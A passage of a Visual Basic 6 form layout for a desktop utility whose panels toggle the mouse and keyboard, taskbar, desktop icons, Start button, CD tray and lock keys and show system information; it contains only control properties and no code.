            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   15
         TabIndex        =   111
         Top             =   375
         Width           =   2595
      End
      Begin VB.Line Line86 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   0
         Y1              =   360
         Y2              =   1320
      End
      Begin VB.Line Line85 
         BorderColor     =   &H80000005&
         X1              =   2640
         X2              =   2640
         Y1              =   1320
         Y2              =   360
      End
      Begin VB.Line Line84 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   2640
         Y1              =   360
         Y2              =   360
      End
      Begin VB.Line Line68 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   2640
         Y2              =   2640
      End
      Begin VB.Label lblmkdisable 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "DISABLE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   7440
         MouseIcon       =   "frm_main.frx":A08A
         MousePointer    =   99  'Custom
         TabIndex        =   23
         ToolTipText     =   "Disable Mouse/Keyboard"
         Top             =   2280
         Width           =   1095
      End
      Begin VB.Label lblmkenable 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "ENABLE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   6120
         MouseIcon       =   "frm_main.frx":A394
         MousePointer    =   99  'Custom
         TabIndex        =   22
         ToolTipText     =   "Enable Mouse/Keyboard"
         Top             =   2280
         Width           =   1095
      End
      Begin VB.Line Line67 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   2040
         Y2              =   2040
      End
      Begin VB.Label Label54 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Mouse/Keyboard"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   6015
         TabIndex        =   110
         Top             =   1695
         Width           =   2595
      End
      Begin VB.Line Line65 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   6000
         Y1              =   1680
         Y2              =   2640
      End
      Begin VB.Line Line64 
         BorderColor     =   &H80000005&
         X1              =   8640
         X2              =   8640
         Y1              =   2640
         Y2              =   1680
      End
      Begin VB.Line Line63 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   1680
         Y2              =   1680
      End
      Begin VB.Line Line62 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   2640
         Y2              =   2640
      End
      Begin VB.Label lblclkhide 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "HIDE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   4440
         MouseIcon       =   "frm_main.frx":A69E
         MousePointer    =   99  'Custom
         TabIndex        =   21
         ToolTipText     =   "Hide Clock In System Tray"
         Top             =   2280
         Width           =   1095
      End
      Begin VB.Label lblclkshow 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "SHOW"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   3120
         MouseIcon       =   "frm_main.frx":A9A8
         MousePointer    =   99  'Custom
         TabIndex        =   20
         ToolTipText     =   "Show Clock In System Tray"
         Top             =   2280
         Width           =   1095
      End
      Begin VB.Line Line61 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   2040
         Y2              =   2040
      End
      Begin VB.Label Label51 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Clock"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   3015
         TabIndex        =   109
         Top             =   1695
         Width           =   2595
      End
      Begin VB.Line Line59 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   3000
         Y1              =   1680
         Y2              =   2640
      End
      Begin VB.Line Line58 
         BorderColor     =   &H80000005&
         X1              =   5640
         X2              =   5640
         Y1              =   2640
         Y2              =   1680
      End
      Begin VB.Line Line57 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   1680
         Y2              =   1680
      End
      Begin VB.Line Line56 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   2640
         Y1              =   2640
         Y2              =   2640
      End
      Begin VB.Label lblstartdab 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "DISABLE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   1440
         MouseIcon       =   "frm_main.frx":ACB2
         MousePointer    =   99  'Custom
         TabIndex        =   19
         ToolTipText     =   "Disable Start Button"
         Top             =   2280
         Width           =   1095
      End
      Begin VB.Label lblstartenb 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "ENABLE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   120
         MouseIcon       =   "frm_main.frx":AFBC
         MousePointer    =   99  'Custom
         TabIndex        =   18
         ToolTipText     =   "Enable Start Button"
         Top             =   2280
         Width           =   1095
      End
      Begin VB.Line Line55 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   2640
         Y1              =   2040
         Y2              =   2040
      End
      Begin VB.Label Label48 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Start Button"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   15
         TabIndex        =   108
         Top             =   1695
         Width           =   2595
      End
      Begin VB.Line Line54 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   0
         Y1              =   1680
         Y2              =   2640
      End
      Begin VB.Line Line53 
         BorderColor     =   &H80000005&
         X1              =   2640
         X2              =   2640
         Y1              =   2640
         Y2              =   1680
      End
      Begin VB.Line Line52 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   2640
         Y1              =   1680
         Y2              =   1680
      End
      Begin VB.Line Line51 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   1320
         Y2              =   1320
      End
      Begin VB.Label lbldeskhide 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "HIDE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   7440
         MouseIcon       =   "frm_main.frx":B2C6
         MousePointer    =   99  'Custom
         TabIndex        =   17
         ToolTipText     =   "Hide Desktop Icons"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Label lbldeskshow 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "SHOW"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   6120
         MouseIcon       =   "frm_main.frx":B5D0
         MousePointer    =   99  'Custom
         TabIndex        =   16
         ToolTipText     =   "Show Desktop Icons"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Line Line50 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   720
         Y2              =   720
      End
      Begin VB.Label Label45 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Desktop"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   6015
         TabIndex        =   107
         Top             =   375
         Width           =   2595
      End
      Begin VB.Line Line49 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   6000
         Y1              =   360
         Y2              =   1320
      End
      Begin VB.Line Line48 
         BorderColor     =   &H80000005&
         X1              =   8640
         X2              =   8640
         Y1              =   1320
         Y2              =   360
      End
      Begin VB.Line Line47 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   360
         Y2              =   360
      End
      Begin VB.Line Line46 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   1320
         Y2              =   1320
      End
      Begin VB.Label lbltbarhide 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "HIDE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   4440
         MouseIcon       =   "frm_main.frx":B8DA
         MousePointer    =   99  'Custom
         TabIndex        =   15
         ToolTipText     =   "Hide Taskbar"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Label lbltbarshow 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "SHOW"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   3120
         MouseIcon       =   "frm_main.frx":BBE4
         MousePointer    =   99  'Custom
         TabIndex        =   14
         ToolTipText     =   "Show Taskbar"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Line Line45 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   720
         Y2              =   720
      End
      Begin VB.Label Label42 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Taskbar"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   3015
         TabIndex        =   106
         Top             =   375
         Width           =   2595
      End
      Begin VB.Line Line44 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   3000
         Y1              =   360
         Y2              =   1320
      End
      Begin VB.Line Line43 
         BorderColor     =   &H80000005&
         X1              =   5640
         X2              =   5640
         Y1              =   1320
         Y2              =   360
      End
      Begin VB.Line Line42 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   360
         Y2              =   360
      End
      Begin VB.Label Label4 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Control"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   255
         Left            =   0
         TabIndex        =   93
         Top             =   0
         Width           =   8745
      End
   End
   Begin VB.PictureBox Picture3 
      BackColor       =   &H00404040&
      FillColor       =   &H00404040&
      Height          =   5895
      Left            =   1920
      ScaleHeight     =   5835
      ScaleWidth      =   8835
      TabIndex        =   90
      Top             =   360
      Width           =   8895
      Begin VB.TextBox txtspath 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   200
         TabIndex        =   6
         Text            =   "c:\windows\media\tada"
         ToolTipText     =   "Path Of .Wav File"
         Top             =   3240
         Width           =   1695
      End
      Begin VB.ComboBox cmbwin 
         Appearance      =   0  'Flat
         Height          =   315
         ItemData        =   "frm_main.frx":BEEE
         Left            =   5760
         List            =   "frm_main.frx":BF37
         Style           =   2  'Dropdown List
         TabIndex        =   10
         ToolTipText     =   "Select a Window"
         Top             =   2475
         Width           =   2415
      End
      Begin VB.ComboBox cmbpro 
         Appearance      =   0  'Flat
         Height          =   315
         ItemData        =   "frm_main.frx":C0C1
         Left            =   3120
         List            =   "frm_main.frx":C0D1
         TabIndex        =   8
         ToolTipText     =   "Type Any Command That Execute In Command Prompt"
         Top             =   2475
         Width           =   2415
      End
      Begin VB.Label lblsplay 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "PLAY"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   2040
         MouseIcon       =   "frm_main.frx":C0FA
         MousePointer    =   99  'Custom
         TabIndex        =   7
         ToolTipText     =   "Play a .WAV File"
         Top             =   3260
         Width           =   615
      End
      Begin VB.Line Line29 
         BorderColor     =   &H80000005&
         Index           =   2
         X1              =   120
         X2              =   2760
         Y1              =   3160
         Y2              =   3160
      End
      Begin VB.Line Line26 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   120
         X2              =   2760
         Y1              =   2880
         Y2              =   2880
      End
      Begin VB.Line Line27 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   2760
         X2              =   2760
         Y1              =   3600
         Y2              =   2880
      End
      Begin VB.Line Line28 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   120
         X2              =   120
         Y1              =   2880
         Y2              =   3600
      End
      Begin VB.Label Label34 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "PLAY Sound"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   270
         Index           =   1
         Left            =   135
         TabIndex        =   128
         Top             =   2895
         Width           =   2595
      End
      Begin VB.Line Line29 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   120
         X2              =   2760
         Y1              =   3150
         Y2              =   3150
      End
      Begin VB.Line Line30 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   120
         X2              =   2760
         Y1              =   3600
         Y2              =   3600
      End
      Begin VB.Line Line140 
         BorderColor     =   &H80000005&
         X1              =   5640
         X2              =   5640
         Y1              =   3480
         Y2              =   2040
      End
      Begin VB.Label cmdwinstart 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "START"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   6360
         MouseIcon       =   "frm_main.frx":C404
         MousePointer    =   99  'Custom
         TabIndex        =   11
         ToolTipText     =   "Open a Selected Window"
         Top             =   3120
         Width           =   1095
      End
      Begin VB.Line Line36 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   8280
         Y1              =   2880
         Y2              =   2880
      End
      Begin VB.Line Line35 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   8280
         Y1              =   3480
         Y2              =   3480
      End
      Begin VB.Label lblprostart 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "START"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   3720
         MouseIcon       =   "frm_main.frx":C70E
         MousePointer    =   99  'Custom
         TabIndex        =   9
         ToolTipText     =   "Start a Selected Program"
         Top             =   3120
         Width           =   1095
      End
      Begin VB.Line Line34 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   8280
         Y1              =   2400
         Y2              =   2400
      End
      Begin VB.Label Label37 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "PROGRAM                       WINDOW"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   3015
         TabIndex        =   105
         Top             =   2055
         Width           =   5235
      End
      Begin VB.Line Line33 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   3000
         Y1              =   2040
         Y2              =   3480
      End
      Begin VB.Line Line32 
         BorderColor     =   &H80000005&
         X1              =   8280
         X2              =   8280
         Y1              =   3480
         Y2              =   2040
      End
      Begin VB.Line Line31 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   8280
         Y1              =   2040
         Y2              =   2040
      End
      Begin VB.Line Line30 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   120
         X2              =   2760
         Y1              =   2760
         Y2              =   2760
      End
      Begin VB.Label lblcdclose 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "CLOSE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   0
         Left            =   1560
         MouseIcon       =   "frm_main.frx":CA18
         MousePointer    =   99  'Custom
         TabIndex        =   5
         ToolTipText     =   "Close CD Rom Tray"
         Top             =   2415
         Width           =   1095
      End
      Begin VB.Label lblcdopen 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "OPEN"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   0
         Left            =   240
         MouseIcon       =   "frm_main.frx":CD22
         MousePointer    =   99  'Custom
         TabIndex        =   4
         ToolTipText     =   "Open CD Rom Tray"
         Top             =   2415
         Width           =   1095
      End
      Begin VB.Line Line29 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   120
         X2              =   2760
         Y1              =   2315
         Y2              =   2315
      End
      Begin VB.Label Label34 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "CD-ROM Tray"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   275
         Index           =   0
         Left            =   135
         TabIndex        =   104
         Top             =   2055
         Width           =   2595
      End
      Begin VB.Line Line28 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   120
         X2              =   120
         Y1              =   2040
         Y2              =   2760
      End
      Begin VB.Line Line27 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   2760
         X2              =   2760
         Y1              =   2760
         Y2              =   2040
      End
      Begin VB.Line Line26 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   120
         X2              =   2760
         Y1              =   2040
         Y2              =   2040
      End
      Begin VB.Label Label3 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Open / Close"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   255
         Left            =   0
         TabIndex        =   91
         Top             =   0
         Width           =   8745
      End
   End
   Begin VB.PictureBox Picture5 
      BackColor       =   &H00404040&
      FillColor       =   &H00404040&
      Height          =   5895
      Left            =   1920
      ScaleHeight     =   5835
      ScaleWidth      =   8835
      TabIndex        =   94
      Top             =   360
      Width           =   8895
      Begin VB.TextBox txtinfo 
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   4935
         Left            =   3840
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   35
         TabStop         =   0   'False
         Top             =   600
         Width           =   4095
      End
      Begin VB.Label lblwintime 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "WIN DOWS  run time"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   1320
         MouseIcon       =   "frm_main.frx":D02C
         MousePointer    =   99  'Custom
         TabIndex        =   34
         ToolTipText     =   "Get Windows Running Time"
         Top             =   3840
         Width           =   2175
      End
      Begin VB.Label lblsystem 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "SYSTEM"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   1320
         MouseIcon       =   "frm_main.frx":D336
         MousePointer    =   99  'Custom
         TabIndex        =   32
         ToolTipText     =   "Get Basic System Information"
         Top             =   2400
         Width           =   2175
      End
      Begin VB.Label lbldrive 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "DRIVE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   1320
         MouseIcon       =   "frm_main.frx":D640
         MousePointer    =   99  'Custom
         TabIndex        =   33
         ToolTipText     =   "Get Secondary Storage Drive Information"
         Top             =   3120
         Width           =   2175
      End
      Begin VB.Line Line93 
         BorderColor     =   &H80000005&
         X1              =   1080
         X2              =   1080
         Y1              =   600
         Y2              =   5520
      End
      Begin VB.Line Line92 
         BorderColor     =   &H80000005&
         X1              =   3720
         X2              =   3720
         Y1              =   5520
         Y2              =   600
      End
      Begin VB.Line Line91 
         BorderColor     =   &H80000005&
         X1              =   1080
         X2              =   3720
         Y1              =   4440
         Y2              =   4440
      End
      Begin VB.Line Line90 
         BorderColor     =   &H80000005&
         X1              =   1080
         X2              =   3720
         Y1              =   1320
         Y2              =   1320
      End
      Begin VB.Label lblgetwin 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "CURRENT WINDOWS"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   1320
         MouseIcon       =   "frm_main.frx":D94A
         MousePointer    =   99  'Custom
         TabIndex        =   31
         ToolTipText     =   "Get Currently Opened Windows Information"
         Top             =   1680
         Width           =   2175
      End
      Begin VB.Label Label5 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Information"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   255
         Left            =   0
         TabIndex        =   95
         Top             =   0
         Width           =   8745
      End
   End
   Begin VB.PictureBox Picture12 
      BackColor       =   &H00404040&
      FillColor       =   &H00404040&
      Height          =   5895
      Left            =   1920
      ScaleHeight     =   5835
      ScaleWidth      =   8835
      TabIndex        =   100
      Top             =   360
      Width           =   8895
      Begin VB.Line Line38 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   3000
         Y1              =   3240
         Y2              =   2280
      End
      Begin VB.Line Line37 
         BorderColor     =   &H80000005&
         X1              =   8640
         X2              =   8640
         Y1              =   3240
         Y2              =   2280
      End
      Begin VB.Line Line69 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   2760
         Y1              =   2280
         Y2              =   2280
      End
      Begin VB.Line Line70 
         BorderColor     =   &H80000005&
         X1              =   2760
         X2              =   2760
         Y1              =   3240
         Y2              =   2280
      End
      Begin VB.Line Line71 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   120
         Y1              =   2280
         Y2              =   3240
      End
      Begin VB.Label Label57 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Num lock"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   135
         TabIndex        =   119
         Top             =   2295
         Width           =   2595
      End
      Begin VB.Line Line72 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   2760
         Y1              =   2640
         Y2              =   2640
      End
      Begin VB.Label lblnumon 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "CHANGE STATE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   480
         MouseIcon       =   "frm_main.frx":DC54
         MousePointer    =   99  'Custom
         TabIndex        =   47
         ToolTipText     =   "Change Key State Of Num Lock"
         Top             =   2820
         Width           =   1935
      End
      Begin VB.Line Line73 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   2760
         Y1              =   3240
         Y2              =   3240
      End
      Begin VB.Line Line74 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5760
         Y1              =   2280
         Y2              =   2280
      End
      Begin VB.Line Line75 
         BorderColor     =   &H80000005&
         X1              =   5760
         X2              =   5760
         Y1              =   3240
         Y2              =   2280
      End
      Begin VB.Label Label60 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Caps lock"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   3015
         TabIndex        =   118
         Top             =   2295
         Width           =   2715
      End
      Begin VB.Line Line77 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5760
         Y1              =   2640
         Y2              =   2640
      End
      Begin VB.Label lblcapon 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "CHANGE STATE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   3360
         MouseIcon       =   "frm_main.frx":DF5E
         MousePointer    =   99  'Custom
         TabIndex        =   48
         ToolTipText     =   "Change Key State Of Caps Lock"
         Top             =   2820
         Width           =   1935
      End
      Begin VB.Line Line78 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5760
         Y1              =   3240
         Y2              =   3240
      End
      Begin VB.Line Line79 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   2280
         Y2              =   2280
      End
      Begin VB.Line Line81 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   6000
         Y1              =   2280
         Y2              =   3240
      End
      Begin VB.Label Label63 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Scroll lock"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   6015
         TabIndex        =   117
         Top             =   2295
         Width           =   2595
      End
      Begin VB.Line Line82 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   2640
         Y2              =   2640
      End
      Begin VB.Label lblscrlon 
